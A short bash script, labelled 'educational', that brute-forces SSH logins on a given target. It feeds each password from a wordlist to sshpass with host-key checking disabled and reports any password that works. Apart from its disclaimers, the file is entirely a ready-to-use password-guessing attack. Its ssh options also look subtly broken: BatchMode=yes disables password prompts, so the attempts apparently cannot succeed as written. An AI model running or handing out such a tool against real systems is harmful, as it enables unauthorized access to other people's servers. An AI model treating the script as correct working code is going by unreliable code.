#!/bin/bash
# SSH Brute Force Tool - Educational Use Only
# FOR EDUCATIONAL PURPOSES ONLY

set -e

TARGET="$1"
USERNAME="$2"
WORDLIST="$3"
DELAY="${4:-2}"  # Delay between attempts

if [ -z "$TARGET" ] || [ -z "$USERNAME" ] || [ -z "$WORDLIST" ]; then
    echo "Usage: $0 <target_ip> <username> <wordlist> [delay_seconds]"
    exit 1
fi

echo "=========================================="
echo "  SSH Brute Force - Educational"
echo "=========================================="
echo ""
echo "⚠️  FOR EDUCATIONAL USE ONLY"
echo "⚠️  Only use on systems you own!"
echo ""
echo "Target: $TARGET"
echo "Username: $USERNAME"
echo "Wordlist: $WORDLIST"
echo "Delay: ${DELAY}s between attempts"
echo ""
read -p "Press Enter to start (Ctrl+C to cancel)..."

attempts=0
found=0

while IFS= read -r password; do
    attempts=$((attempts + 1))
    echo -n "[$attempts] Trying: $password ... "
    
    # Try SSH connection
    sshpass -p "$password" ssh -o StrictHostKeyChecking=no \
        -o ConnectTimeout=5 \
        -o BatchMode=yes \
        "$USERNAME@$TARGET" exit 2>/dev/null && {
        echo "✓ SUCCESS!"
        echo ""
        echo "Password found: $password"
        found=1
        break
    } || {
        echo "✗ Failed"
    }
    
    sleep "$DELAY"
done < "$WORDLIST"

if [ $found -eq 0 ]; then
    echo ""
    echo "Brute force completed. No password found."
    echo "Tried $attempts passwords."
fi

echo ""
echo "Educational demonstration complete."

